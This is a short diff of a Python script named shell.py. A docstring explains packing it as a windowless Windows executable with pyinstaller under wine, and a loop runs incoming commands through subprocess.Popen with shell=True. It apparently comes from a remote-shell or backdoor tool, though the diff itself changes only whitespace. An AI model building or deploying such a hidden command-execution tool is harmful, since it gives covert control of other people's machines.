@@ -1,11 +1,10 @@
 #!/usr/bin/env python3 
 
 '''
+
 In order to convert the shell to an exe, wine needs to be installed and the following
 command must be run:
-
 sudo wine /root/.wine/drive_c/Python3/Scripts/pyinstaller.exe --onefile --noconsole shell.py 
-
 
 '''
 
@@ -51,6 +50,7 @@ def shell():
                 os.chdir(command[3:])
             except:
                 continue
+
         else:
 
             process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
